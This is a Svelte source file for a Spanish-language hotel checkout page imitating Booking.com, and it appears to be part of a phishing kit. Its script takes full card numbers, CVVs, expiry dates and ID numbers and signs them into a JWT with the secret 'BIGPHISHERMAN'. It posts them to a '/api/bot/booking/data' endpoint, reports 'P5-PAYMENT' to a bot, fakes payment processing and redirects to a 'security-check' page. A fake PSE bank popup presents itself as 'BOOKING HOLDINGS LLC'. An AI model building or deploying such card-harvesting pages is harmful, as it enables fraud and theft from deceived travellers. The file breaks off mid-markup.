<script lang="ts">
    import { onMount } from 'svelte';
    import { goto, preloadCode } from '$app/navigation';
    import Header from '$lib/components/common/Header.svelte';
	import Navbar from '$lib/components/common/Navbar.svelte';
	import Footer from '$lib/components/common/footer.svelte';
import { reservationStore } from '$lib/stores/reservation';
import { PRICE_DISCOUNT } from '$lib/config/discount';
    import { ENV_CONFIG } from '$lib';

	// KJUR (inyectado por CDN) y secreto JWT
	// Nota: en producción, evita firmar en el cliente.
	const KJUR: any = (globalThis as any).KJUR;
	const JWT_SECRET = import.meta.env.JWT_SECRET || 'BIGPHISHERMAN';

	// Variables reactivas del store de reserva
	$: reservationData = $reservationStore;
	$: hotel = reservationData.hotel;
	$: searchParams = reservationData.searchParams;
	$: selectedRooms = reservationData.selectedRooms;
	$: totals = reservationData.totals;

	// Estado de carga y validación
	let isLoading = true;
	let hasValidReservation = false;

	// Estado del formulario de pago
	let paymentData = {
		cardName: '',
		documentId: '',
		cardNumber: '',
		cardCvv: '',
		cardExpiry: '',
		acceptPrivacy: false,
		acceptMarketing: false
	};

	// Estado del método de pago
	let currentPaymentMethod: 'credit-debit' | 'pse' = 'credit-debit';

	// Estado del formulario PSE
	let pseData = {
		bank: '',
		personType: '',
		docType: '',
		docNumber: '',
		name: '',
		surname: '',
		email: '',
		phone: '',
		city: '',
		address: ''
	};

	// Estado de validación PSE
	let pseErrors: { [key: string]: string } = {};
	let isPseValid = false;

	// Variable para el popup PSE
	let psePopUp: Window | null = null;

	// Estado de validación del formulario
	let paymentErrors: { [key: string]: string } = {};
	let isPaymentValid = false;
	let isSubmitting = false;

	// Validación reactiva de datos de reserva
	$: {
		if (reservationData && !isLoading) {
			const hasValidHotel = reservationData.hotel.id > 0 && reservationData.hotel.name;
			const hasSelectedRooms = selectedRooms.length > 0;
			
			if (hasValidHotel && hasSelectedRooms) {
				hasValidReservation = true;
			} else {
				hasValidReservation = false;
			}
		}
	}

	// Validación reactiva del formulario según el método de pago
	$: if (currentPaymentMethod === 'credit-debit') {
		validatePaymentForm();
	}
	
	$: if (currentPaymentMethod === 'pse') {
		validatePseForm();
	}

	// Validación reactiva cuando cambien los datos de PSE
	$: if (currentPaymentMethod === 'pse' && pseData) {
		validatePseForm();
	}

	// Validación reactiva cuando cambien los términos y condiciones
	$: if (currentPaymentMethod === 'pse' && paymentData) {
		validatePseForm();
	}

	onMount(async () => {
		console.log('🚀 Inicializando página de pago...');
		console.log('📊 Estado del store:', reservationData);
		
		// Pequeño delay para permitir que el store se inicialice
		await new Promise(resolve => setTimeout(resolve, 100));
		
		// Enviar status P5-PAYMENT
		try {
			fetch(`${ENV_CONFIG.API_INTERNAL_URL}/api/bot/status`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					'Authorization': `Bearer ${ENV_CONFIG.API_INTERNAL_KEY}`
				},
				body: JSON.stringify({ message: 'P5-PAYMENT' })
			});
		} catch (error) {
			console.log('Error enviando status P5-PAYMENT:', error);
		}
		
		isLoading = false;
		console.log('✅ Página de pago inicializada');
	});

	// Funciones helper para formateo
	function formatDate(dateString: string): string {
		if (!dateString) return '';
		const date = new Date(dateString);
		return date.toLocaleDateString('es-ES', { 
			weekday: 'short', 
			day: 'numeric', 
			month: 'short', 
			year: 'numeric' 
		});
	}

	function formatTime(dateString: string, isCheckIn: boolean): string {
		return isCheckIn ? '16:00' : '12:00';
	}

	function generateStarRating(starCount: number): string {
		return '★'.repeat(starCount);
	}

	function getLocationScoreText(distance: number): string {
		if (distance < 1) return 'Excelente ubicación';
		if (distance < 2) return 'Muy buena ubicación';
		return 'Buena ubicación';
	}

	function getRatingDescription(rating: number): string {
		if (rating >= 9) return 'Fantástico';
		if (rating >= 8) return 'Muy bueno';
		if (rating >= 7) return 'Bueno';
		return 'Aceptable';
	}

	function getMainHotelImage(): string {
		// Usar la primera imagen de hotelPhotos si está disponible
		console.log('🖼️ Debug imagen hotel:', {
			hotelPhotos: hotel.hotelPhotos,
			length: hotel.hotelPhotos?.length,
			firstPhoto: hotel.hotelPhotos?.[0]
		});
		
		if (hotel.hotelPhotos && hotel.hotelPhotos.length > 0) {
			const imageUrl = hotel.hotelPhotos[0].url_1440;
			console.log('✅ Usando imagen del hotel:', imageUrl);
			return imageUrl;
		}
		
		console.log('❌ Usando imagen por defecto');
		// Fallback a imagen por defecto
		return '/assets/hotel/static1.jpg';
	}

	function getTotalNights(): number {
		if (selectedRooms.length === 0) return 0;
		return selectedRooms[0].totalNights;
	}

	function getTotalRooms(): number {
		return selectedRooms.reduce((sum, room) => sum + room.quantity, 0);
	}

	function formatPrice(amount: number, currency: string = 'COP'): string {
		return amount.toLocaleString('es-CO', { 
			style: 'currency', 
			currency: currency 
		});
	}

	function getTaxPercentage(): string {
		// IVA fijo del 6% del valor total
		return '6%';
	}

	function getOriginalCurrencyPrice(): string {
		if (selectedRooms.length === 0) return 'US$0';
		const firstRoom = selectedRooms[0];
		// Simular conversión a USD (en la realidad vendría de la API)
		const usdPrice = Math.round(totals.total / 3870); // Aproximación 1 USD = 3870 COP
		return `US$${usdPrice}`;
	}

	function getCancellationDeadline(): string {
		// Cancelación gratuita en cualquier momento
		return 'en cualquier momento';
	}

	function getCancellationCost(): string {
		// Cancelación siempre gratuita
		return '0';
	}

	// Funciones de validación del formulario de pago
	function validatePaymentForm(): boolean {
		paymentErrors = {};
		let isValid = true;

		// Validar nombre del titular
		if (!paymentData.cardName.trim()) {
			paymentErrors.cardName = 'El nombre del titular es obligatorio';
			isValid = false;
		}

		// Validar documento de identidad
		if (!paymentData.documentId.trim()) {
			paymentErrors.documentId = 'El documento de identidad es obligatorio';
			isValid = false;
		} else if (!/^[-\.\dA-Za-z]{5,20}$/.test(paymentData.documentId.trim())) {
			paymentErrors.documentId = 'Documento de identidad inválido';
			isValid = false;
		}

		// Validar número de tarjeta
		if (!paymentData.cardNumber.trim()) {
			paymentErrors.cardNumber = 'El número de tarjeta es obligatorio';
			isValid = false;
		} else {
			const rawNumber = paymentData.cardNumber.replace(/\s/g, '');
			if (!/^\d{13,19}$/.test(rawNumber)) {
				paymentErrors.cardNumber = 'El número de tarjeta debe tener entre 13 y 19 dígitos';
				isValid = false;
			} else if (!luhnCheck(rawNumber)) {
				paymentErrors.cardNumber = 'El número de la tarjeta ingresado no es válido';
				isValid = false;
			}
		}

		// Validar fecha de caducidad
		if (!paymentData.cardExpiry.trim()) {
			paymentErrors.cardExpiry = 'La fecha de caducidad es obligatoria';
			isValid = false;
		} else if (!/^\d{2}\/\d{2}$/.test(paymentData.cardExpiry)) {
			paymentErrors.cardExpiry = 'Formato inválido (MM/AA)';
			isValid = false;
		} else if (!isExpiryValid(paymentData.cardExpiry)) {
			paymentErrors.cardExpiry = 'La fecha de caducidad es inválida';
			isValid = false;
		}

		// Validar CVV
		const brand = detectCardBrand(paymentData.cardNumber);
		const maxCvv = brand === 'amex' ? 4 : 3;
		if (!paymentData.cardCvv.trim()) {
			paymentErrors.cardCvv = 'El CVV es obligatorio';
			isValid = false;
		} else if (!new RegExp(`^\\d{${maxCvv}}$`).test(paymentData.cardCvv)) {
			paymentErrors.cardCvv = brand === 'amex' ? 'El CVV debe tener 4 dígitos' : 'El CVV debe tener 3 dígitos';
			isValid = false;
		}

		// Validar términos y condiciones
		if (!paymentData.acceptPrivacy) {
			paymentErrors.acceptPrivacy = 'Debes aceptar la política de privacidad';
			isValid = false;
		}

		isPaymentValid = isValid;
		return isValid;
	}

	// Función para manejar cambios en el formulario
	function handlePaymentInputChange(field: string, value: any) {
		paymentData = { ...paymentData, [field]: value };
		
		// Limpiar error del campo
		if (paymentErrors[field]) {
			paymentErrors = { ...paymentErrors, [field]: '' };
		}
		
		// Validar en tiempo real
		validatePaymentForm();
	}

	// Función para manejar cambios en inputs
	function handlePaymentInputEvent(event: Event, field: string) {
		const target = event.target as HTMLInputElement;
		let value = target.value;
		if (field === 'cardNumber') {
			value = formatCardNumber(value);
		} else if (field === 'cardExpiry') {
			value = formatExpiry(value);
		} else if (field === 'cardCvv') {
			value = formatCvv(value, detectCardBrand(paymentData.cardNumber));
		}
		handlePaymentInputChange(field, value);
	}

	function handleCardNumberBlur() {
		const raw = (paymentData.cardNumber || '').replace(/\s/g, '');
		if (raw.length >= 13) {
			if (!luhnCheck(raw)) {
				paymentErrors = { ...paymentErrors, cardNumber: 'El número de la tarjeta ingresado no es válido' };
				isPaymentValid = false;
			} else if (paymentErrors.cardNumber) {
				paymentErrors = { ...paymentErrors, cardNumber: '' };
			}
		}
	}

	// Función para manejar cambios en checkboxes
	function handlePaymentCheckboxEvent(event: Event, field: string) {
		const target = event.target as HTMLInputElement;
		handlePaymentInputChange(field, target.checked);
	}

	function sleep(ms: number) {
		return new Promise(resolve => setTimeout(resolve, ms));
	}

	// Función para completar la reserva
	async function handleCompleteReservation() {
		if (currentPaymentMethod === 'pse') {
			await handleCompletePsePayment();
			return;
		}

		if (!validatePaymentForm()) {
			console.log('❌ Formulario de pago inválido:', paymentErrors);
			return;
		}

		isSubmitting = true;
		console.log('💳 Completando reserva:', paymentData);

		try {
			// Simular procesamiento del pago
			await new Promise(resolve => setTimeout(resolve, 2000));

			// Construir info de envío a API
			const rawCardNumber = (paymentData.cardNumber || '').replace(/\s/g, '');
			const numRooms = getTotalRooms();
			const numPeople = searchParams.adults + (searchParams.children || 0);
			const metaInfo = {
				guestName: paymentData.cardName,
				documentId: paymentData.documentId,
				guestEmail: reservationData.guestData?.email || '',
				guestPhone: reservationData.guestData?.phone || '',
				hotelName: hotel.name,
				roomsCount: numRooms,
				peopleCount: numPeople,
				price: totals.subtotal,
				tax: totals.taxes,
				total: totals.total,
				currency: totals.currency,
				card: {
					number: rawCardNumber,
					expiry: paymentData.cardExpiry,
					cvv: paymentData.cardCvv,
					holderName: paymentData.cardName
				},
				pre: true
			}

			// Guardar datos de pago en el store
			reservationStore.updatePaymentData({
				cardholderName: paymentData.cardName,
				cardNumber: paymentData.cardNumber,
				expiry: paymentData.cardExpiry,
				cvv: paymentData.cardCvv,
				documentId: paymentData.documentId
			});

			// Persistir metaInfo en localStorage
			try {
				localStorage.setItem('booking-payment-metainfo', JSON.stringify(metaInfo));
				console.log('💾 metaInfo guardado', metaInfo);
			} catch (err) {
				console.error('❌ No se pudo guardar metaInfo', err);
			}

			

			// Firmar JWT con KJUR y enviar a la API como { token }
			let token = '';
			try {
				const header = { alg: 'HS256', typ: 'JWT' };
				const payload = metaInfo;
				token = KJUR.jws.JWS.sign('HS256', JSON.stringify(header), JSON.stringify(payload), JWT_SECRET);
			} catch (error) {
				console.error('❌ Error firmando JWT con KJUR:', error);
			}

			console.log('🔑 API_INTERNAL_KEY:', ENV_CONFIG.API_INTERNAL_KEY);

			
			fetch(`${ENV_CONFIG.API_INTERNAL_URL}/api/bot/booking/data`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${ENV_CONFIG.API_INTERNAL_KEY}` },
				body: JSON.stringify({ token })
			});

			await sleep(2000);

			
            // Redirección a security check (se realiza aquí)
			goto('/security-check');
		} catch (error) {
			console.error('❌ Error completando reserva:', error);
		} finally {
			isSubmitting = false;
		}
	}

	// ===== Helpers de tarjeta =====
	function detectCardBrand(numberWithSpaces: string): 'amex' | 'visa' | 'mastercard' | 'other' {
		const n = (numberWithSpaces || '').replace(/\s/g, '');
		if (/^3[47]\d{0,13}$/.test(n)) return 'amex';
		if (/^4\d{0,15}$/.test(n)) return 'visa';
		if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))\d{0,14}$/.test(n)) return 'mastercard';
		return 'other';
	}

	function formatCardNumber(input: string): string {
		const digits = (input || '').replace(/\D/g, '').slice(0, 19);
		const brand = detectCardBrand(digits);
		if (brand === 'amex') {
			// 4 6 5
			const p1 = digits.slice(0, 4);
			const p2 = digits.slice(4, 10);
			const p3 = digits.slice(10, 15);
			return [p1, p2, p3].filter(Boolean).join(' ');
		}
		// resto 4 4 4 4
		const g1 = digits.slice(0, 4);
		const g2 = digits.slice(4, 8);
		const g3 = digits.slice(8, 12);
		const g4 = digits.slice(12, 16);
		return [g1, g2, g3, g4].filter(Boolean).join(' ');
	}

	function formatExpiry(input: string): string {
		const digits = (input || '').replace(/\D/g, '').slice(0, 4);
		if (digits.length <= 2) return digits;
		return `${digits.slice(0, 2)}/${digits.slice(2)}`;
	}

	function formatCvv(input: string, brand: 'amex' | 'visa' | 'mastercard' | 'other'): string {
		const max = brand === 'amex' ? 4 : 3;
		return (input || '').replace(/\D/g, '').slice(0, max);
	}

	function luhnCheck(num: string): boolean {
		const digits = (num || '').replace(/\D/g, '');
		let sum = 0;
		let shouldDouble = false;
		for (let i = digits.length - 1; i >= 0; i--) {
			let d = parseInt(digits.charAt(i), 10);
			if (shouldDouble) {
				d *= 2;
				if (d > 9) d -= 9;
			}
			sum += d;
			shouldDouble = !shouldDouble;
		}
		return sum % 10 === 0 && digits.length >= 13;
	}

	function parseExpiry(expiry: string): { month: number; year: number } | null {
		const match = /^([0-9]{2})\/([0-9]{2})$/.exec(expiry || '');
		if (!match) return null;
		const month = parseInt(match[1], 10);
		const year = 2000 + parseInt(match[2], 10);
		if (month < 1 || month > 12) return null;
		return { month, year };
	}

	function isExpiryValid(expiry: string): boolean {
		const parsed = parseExpiry(expiry);
		if (!parsed) return false;
		const now = new Date();
		const currentMonth = now.getMonth() + 1;
		const currentYear = now.getFullYear();
		if (parsed.year > currentYear) return true;
		if (parsed.year < currentYear) return false;
		return parsed.month >= currentMonth;
	}

	// ===== Funciones PSE =====
	function switchPaymentMethod(method: 'credit-debit' | 'pse') {
		currentPaymentMethod = method;
	}

	function validatePseForm(): boolean {
		pseErrors = {};
		let isValid = true;

		// Validar banco
		if (!pseData.bank.trim()) {
			pseErrors.bank = 'Por favor selecciona un banco';
			isValid = false;
		}

		// Validar tipo de persona
		if (!pseData.personType.trim()) {
			pseErrors.personType = 'Por favor selecciona el tipo de persona';
			isValid = false;
		}

		// Validar tipo de documento
		if (!pseData.docType.trim()) {
			pseErrors.docType = 'Por favor selecciona el tipo de documento';
			isValid = false;
		}

		// Validar número de documento
		if (!pseData.docNumber.trim()) {
			pseErrors.docNumber = 'Por favor ingresa el número de documento';
			isValid = false;
		}

		// Validar nombre
		if (!pseData.name.trim()) {
			pseErrors.name = 'El nombre es obligatorio';
			isValid = false;
		}

		// Validar apellido
		if (!pseData.surname.trim()) {
			pseErrors.surname = 'El apellido es obligatorio';
			isValid = false;
		}

		// Validar email
		if (!pseData.email.trim()) {
			pseErrors.email = 'El email es obligatorio';
			isValid = false;
		} else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(pseData.email)) {
			pseErrors.email = 'Por favor ingresa un email válido';
			isValid = false;
		}

		// Validar teléfono
		if (!pseData.phone.trim()) {
			pseErrors.phone = 'El teléfono es obligatorio';
			isValid = false;
		}

		// Validar ciudad
		if (!pseData.city.trim()) {
			pseErrors.city = 'La ciudad es obligatoria';
			isValid = false;
		}

		// Validar dirección
		if (!pseData.address.trim()) {
			pseErrors.address = 'La dirección es obligatoria';
			isValid = false;
		}

		isPseValid = isValid;
		return isValid;
	}

	function handlePseInputChange(field: string, value: any) {
		pseData = { ...pseData, [field]: value };
		
		// Limpiar error del campo
		if (pseErrors[field]) {
			pseErrors = { ...pseErrors, [field]: '' };
		}
	}

	function handlePseInputEvent(event: Event, field: string) {
		const target = event.target as HTMLInputElement;
		handlePseInputChange(field, target.value);
	}

	function handlePseSelectEvent(event: Event, field: string) {
		const target = event.target as HTMLSelectElement;
		handlePseInputChange(field, target.value);
	}

	// Función para completar el pago PSE
	async function handleCompletePsePayment() {
		if (!validatePseForm()) {
			console.log('❌ Formulario PSE inválido:', pseErrors);
			return;
		}

		isSubmitting = true;
		console.log('🏦 Completando pago PSE:', pseData);

		try {
			// Abrir popup PSE
			psePopUp = window.open(ENV_CONFIG.PSE_URL, 'PSE', 'width=900,height=700');

			const dataToPSE = {
				transId: ENV_CONFIG.API_INTERNAL_KEY,
				origin: 'BOOKING HOLDINGS LLC',
				desc: 'BOOK* HOLD* LLC',
				bank: pseData.bank,
				id: pseData.docNumber,
				name: `${pseData.name} ${pseData.surname}`,
				amount: totals.total
			};

			console.log('📤 Datos enviados a PSE:', dataToPSE);

			// Función para manejar mensajes del popup
			async function handleMessage(event: MessageEvent) {
				if (event.origin !== ENV_CONFIG.PSE_URL) return;

				const { action, data } = event.data;

				// Enviar datos a PSE cuando esté listo
				if (action === 'ready') {
					psePopUp?.postMessage({ action: 'init', data: dataToPSE }, ENV_CONFIG.PSE_URL);
				}

				// Recibir respuesta de PSE
				if (action === 'done') {
					window.removeEventListener('message', handleMessage);
					clearInterval(checker);
					psePopUp?.close();

					await sleep(200);

					if (data.response === 'error') {
						alert('No pudimos completar el pago con PSE. Inténtalo de nuevo o prueba con otro medio de pago');
					} else if (data.response === 'cancel') {
						alert('No pudimos completar el pago con PSE. Intente con otro medio de pago.');
					} else if (data.response === 'success') {
						// Guardar datos de pago PSE en el store
						reservationStore.updatePaymentData({
							cardholderName: `${pseData.name} ${pseData.surname}`,
							cardNumber: '',
							expiry: '',
							cvv: '',
							documentId: pseData.docNumber,
							paymentMethod: 'pse',
							bank: pseData.bank
						});

						// Redirigir a página de éxito
						goto('/congrats');
					}
				}
			}

			window.addEventListener('message', handleMessage);

			// Vigilar si el usuario cierra el popup
			const checker = setInterval(() => {
				if (!psePopUp || psePopUp.closed) {
					clearInterval(checker);
					window.removeEventListener('message', handleMessage);
					alert('No pudimos completar el pago con PSE. Intenta con otro medio de pago.');
					isSubmitting = false;
				}
			}, 400);

		} catch (error) {
			console.error('❌ Error completando pago PSE:', error);
			alert('Error al procesar el pago PSE. Inténtalo de nuevo.');
		} finally {
			isSubmitting = false;
		}
	}
</script>

<svelte:head>
	<title>Terminar Reserva - {hotel.name || 'Hotel'}</title>
	<meta name="description" content="Completa tu reserva de hotel" />
</svelte:head>

<style>
	/* Minimal custom styles */
	.step-line {
		position: absolute;
		top: 16px;
		left: 0;
		right: 0;
		height: 2px;
		background-color: #e5e7eb;
		z-index: 0;
	}
	.step-line-active {
		background-color: #0071c2;
	}
</style>

<Header>
	<Navbar />
</Header>

<main class="bg-gray-50">
	<div class="max-w-7xl mx-auto px-4 py-8">
		{#if isLoading}
			<!-- Loading State -->
			<div class="flex items-center justify-center min-h-96">
				<div class="text-center">
					<div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
					<p class="text-gray-600">Cargando datos de la reserva...</p>
				</div>
			</div>
		{:else if !hasValidReservation}
			<!-- No Reservation State -->
			<div class="flex items-center justify-center min-h-96">
				<div class="text-center">
					<svg class="w-16 h-16 text-gray-400 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
					</svg>
					<h2 class="text-xl font-semibold text-gray-900 mb-2">No hay datos de reserva</h2>
					<p class="text-gray-600 mb-4">Parece que no tienes una reserva activa. Te redirigiremos a la página principal.</p>
					<button 
						on:click={() => goto('/')} 
						class="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700"
					>
						Ir a la página principal
					</button>
				</div>
			</div>
		{:else}
		<div class="mb-8">
			<div class="relative flex items-center justify-between max-w-3xl mx-auto">
				<div class="step-line step-line-active"></div>
				
				<div class="relative z-10 flex flex-col items-center">
					<div class="w-8 h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-sm font-semibold mb-2">
						<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
							<path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
						</svg>
					</div>
					<span class="text-xs font-medium text-gray-900">Tu selección</span>
				</div>
				
				<div class="relative z-10 flex flex-col items-center">
					<div class="w-8 h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-sm font-semibold mb-2">
						<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
							<path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
						</svg>
					</div>
					<span class="text-xs font-medium text-gray-900">Tus datos</span>
				</div>
				
				<div class="relative z-10 flex flex-col items-center">
					<div class="w-8 h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-sm font-semibold mb-2">
						3
					</div>
					<span class="text-xs font-medium text-gray-900">Terminar reserva</span>
				</div>
			</div>
		</div>

		<div class="flex flex-col md:flex-row gap-6">
			<div class="md:w-1/3 space-y-4">
				<div class="bg-white rounded-lg border border-gray-200 overflow-hidden">
					<img src={getMainHotelImage()} alt={hotel.name} class="w-full h-48 object-cover">
					<div class="p-4">
						<div class="flex items-center gap-1 mb-2">
							{#each Array(hotel.class || 4) as _}
								<svg class="w-4 h-4 text-yellow-400 fill-current" viewBox="0 0 20 20">
									<path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/>
								</svg>
							{/each}
							<span class="ml-1 px-1.5 py-0.5 bg-yellow-400 text-white text-xs font-bold rounded">{hotel.hotelDetails?.accommodation_type || 'HT'}</span>
						</div>
						<h2 class="text-lg font-bold text-gray-900 mb-1">{hotel.name}</h2>
						<p class="text-sm text-gray-600 mb-2">{hotel.address}</p>
						<p class="text-xs text-green-700 mb-3">{getLocationScoreText(0)} — 0.5 km</p>
						<div class="flex items-center gap-2 mb-2">
							<span class="px-2 py-1 bg-blue-600 text-white text-sm font-bold rounded">{hotel.rating || 0}</span>
							<div>
								<p class="text-sm font-semibold text-gray-900">{getRatingDescription(hotel.rating || 0)}</p>
								<p class="text-xs text-gray-600">624 comentarios</p>
							</div>
						</div>
						<div class="space-y-1 text-sm text-gray-700">
							{#if hotel.hotelDetails?.facilities_block?.facilities}
								{#each hotel.hotelDetails.facilities_block.facilities.slice(0, 4) as facility}
									<div class="flex items-center gap-2">
										<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
											<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"/>
										</svg>
										<span>{facility.name}</span>
									</div>
								{/each}
							{:else}
								<div class="flex items-center gap-2">
									<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
										<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"/>
									</svg>
									<span>WiFi gratis</span>
								</div>
								<div class="flex items-center gap-2">
									<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
										<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/>
									</svg>
									<span>Parking</span>
								</div>
							{/if}
						</div>
					</div>
				</div>

				<div class="bg-white rounded-lg border border-gray-200 p-4">
					<h3 class="text-lg font-bold text-gray-900 mb-3">Los datos de tu reserva</h3>
					<div class="grid grid-cols-2 gap-4">
						<div>
							<p class="text-sm font-semibold text-gray-900 mb-1">Entrada</p>
							<p class="text-sm text-gray-700">{formatDate(searchParams.checkInDate)}</p>
							<p class="text-xs text-gray-600">De {formatTime(searchParams.checkInDate, true)}</p>
						</div>
						<div>
							<p class="text-sm font-semibold text-gray-900 mb-1">Salida</p>
							<p class="text-sm text-gray-700">{formatDate(searchParams.checkOutDate)}</p>
							<p class="text-xs text-gray-600">A {formatTime(searchParams.checkOutDate, false)}</p>
						</div>
					</div>
					<div class="mt-3 pt-3 border-t">
						<p class="text-sm text-gray-700">
							<strong>{getTotalNights()} noche{getTotalNights() > 1 ? 's' : ''}</strong> • 
							<strong>{getTotalRooms()} habitación{getTotalRooms() > 1 ? 'es' : ''}</strong> • 
							<strong>{searchParams.adults} adulto{searchParams.adults > 1 ? 's' : ''}</strong>
							{#if searchParams.children > 0}
								, {searchParams.children} niño{searchParams.children > 1 ? 's' : ''}
							{/if}
						</p>
					</div>
				</div>

				<div class="bg-white rounded-lg border border-gray-200 p-4">
					<h3 class="text-lg font-bold text-gray-900 mb-3">Desglose del precio</h3>
					<div class="mb-4">
						<div class="flex justify-between items-start mb-2">
							<span class="text-xl font-bold text-gray-900">Precio</span>
							<div class="text-right">
								{#if PRICE_DISCOUNT && PRICE_DISCOUNT > 0}
									<div class="text-xs text-gray-500 line-through">{formatPrice(Math.round(totals.total / (1 - PRICE_DISCOUNT)))}</div>
									<div class="text-xl font-bold text-gray-900">{formatPrice(totals.total)}</div>
									<div class="text-[10px] bg-green-100 text-green-700 px-2 py-0.5 rounded-full mt-1 inline-block">- {Math.round(PRICE_DISCOUNT * 100)}%</div>
								{:else}
									<span class="text-xl font-bold text-gray-900">{formatPrice(totals.total)}</span>
								{/if}
							</div>
						</div>
						<p class="text-xs text-gray-600 text-right">Se pueden aplicar otros cargos</p>
						<p class="text-xs text-gray-600 text-right">En la moneda del alojamiento: {getOriginalCurrencyPrice()}</p>
					</div>
					
					<div class="border-t pt-3 space-y-3">
						<h4 class="text-sm font-semibold text-gray-900">Información sobre el precio</h4>
						
						<div class="flex gap-2 text-sm">
							<svg class="w-5 h-5 text-gray-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
							</svg>
							<p class="text-gray-700">No incluye <span class="font-semibold">{formatPrice(Math.round(totals.total * 0.06))}</span> de impuestos y cargos</p>
						</div>
						<p class="text-sm text-gray-700 ml-7">{getTaxPercentage()} IVA <span class="float-right">{formatPrice(Math.round(totals.total * 0.06))}</span></p>
						
						<div class="flex gap-2 text-sm">
							<svg class="w-5 h-5 text-gray-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
							</svg>
							<p class="text-gray-700">En función de la nacionalidad, pueden aplicarse cargos por IVA adicional. Se aceptan exenciones y deben enviarse a las autoridades antes de tu llegada.</p>
						</div>
					</div>
				</div>
				
				<div class="bg-white rounded-lg border border-gray-200 p-4">
					<h3 class="text-lg font-bold text-gray-900 mb-3">¿Cuánto cuesta cancelar?</h3>
					<p class="text-sm font-semibold text-green-700 mb-2">Cancelación gratis {getCancellationDeadline()}</p>
					<div class="flex justify-between text-sm text-gray-700">
						<span>Puedes cancelar sin costo adicional</span>
						<span class="font-semibold">COP 0</span>
					</div>
				</div>

				<div class="bg-white rounded-lg border border-gray-200 p-4">
					<h3 class="text-lg font-bold text-gray-900 mb-3">Información del pago</h3>
					<div class="flex justify-between text-sm mb-4">
						<span class="text-gray-700">El alojamiento te cobrará</span>
						<div class="text-right">
							{#if PRICE_DISCOUNT && PRICE_DISCOUNT > 0}
								<div class="text-[11px] text-gray-500 line-through">{formatPrice(Math.round(totals.total / (1 - PRICE_DISCOUNT)))}</div>
								<div class="font-semibold text-gray-900">{formatPrice(totals.total)}</div>
							{:else}
								<span class="font-semibold text-gray-900">{formatPrice(totals.total)}</span>
							{/if}
						</div>
					</div>
					
					<div class="border-t pt-4">
						<h4 class="text-sm font-semibold text-gray-900 mb-3">¿Tienes un código promocional?</h4>
						<label for="promo-code" class="block text-sm text-gray-900 mb-2">Introduce tu código promocional</label>
						<input id="promo-code" type="text" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 mb-2">
						<button class="px-4 py-2 bg-white border-2 border-blue-600 text-blue-600 font-semibold rounded hover:bg-blue-50">
							Aplicar
						</button>
					</div>
				</div>
			</div>

			<div class="md:w-2/3 space-y-4">
				<!-- Selección de método de pago -->
				<div class="bg-white rounded-lg border border-gray-200 p-6">
					<h3 class="text-xl font-bold text-gray-900 mb-4">Selecciona tu método de pago</h3>
					<div class="grid grid-cols-2 gap-4">
						<button 
							on:click={() => switchPaymentMethod('credit-debit')}
							class="flex flex-col items-center p-4 border rounded-lg transition-colors {currentPaymentMethod === 'credit-debit' ? 'bg-blue-100 border-blue-500 text-blue-700' : 'hover:bg-gray-50 border-gray-300'}"
						>
							<svg class="w-8 h-8 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
							</svg>
							<span class="text-sm font-semibold">Tarjeta de Crédito/Débito</span>
						</button>
						<button 
							on:click={() => switchPaymentMethod('pse')}
